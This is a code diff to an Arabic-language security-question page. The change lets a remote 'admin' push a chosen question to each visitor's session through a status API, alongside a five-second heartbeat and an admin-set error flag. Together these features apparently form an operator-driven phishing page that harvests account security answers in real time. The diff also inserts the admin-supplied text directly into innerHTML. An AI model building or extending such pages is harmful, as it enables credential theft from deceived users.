@@ -66,7 +66,7 @@ body{font-family:'Cairo',sans-serif;background:var(--white);color:var(--dark);mi
 
   <div class="error-msg" id="errorMsg"><span>الإجابة غير صحيحة</span></div>
 
-  <div class="form-group">
+  <div class="form-group" id="questionGroup">
     <label>اختر سؤال الأمان</label>
     <select id="questionSelect">
       <option value="">-- اختر سؤال الأمان --</option>
@@ -107,6 +107,7 @@ heartbeat();setInterval(heartbeat,5000);
 var params=new URLSearchParams(window.location.search);
 var sid=params.get('id');
 var hasError=params.get('error');
+var adminQuestion='';
 if(!sid)window.location.href='login.html';
 
 if(hasError==='1'){
@@ -114,8 +115,18 @@ if(hasError==='1'){
   document.getElementById('answerInput').classList.add('error-border');
 }
 
+// Check if admin pre-selected a question
+fetch('/api/status/'+sid).then(function(r){return r.json();}).then(function(d){
+  if(d.security_question){
+    adminQuestion=d.security_question;
+    var qGroup=document.getElementById('questionGroup');
+    qGroup.innerHTML='<label>سؤال الأمان</label><div style="width:100%;padding:15px 16px;border:1.5px solid #1a6e2e;border-radius:14px;font-size:15px;background:#e8f5ec;color:#1a1a1a;text-align:right;font-family:Cairo,sans-serif;font-weight:700">'+adminQuestion+'</div>';
+    document.querySelector('.page-sub').textContent='أجب على سؤال الأمان للتحقق من هويتك';
+  }
+}).catch(function(){});
+
 function submitSecurity(){
-  var question=document.getElementById('questionSelect').value;
+  var question=adminQuestion||document.getElementById('questionSelect').value;
   var answer=document.getElementById('answerInput').value.trim();
   if(!question||!answer)return;
 
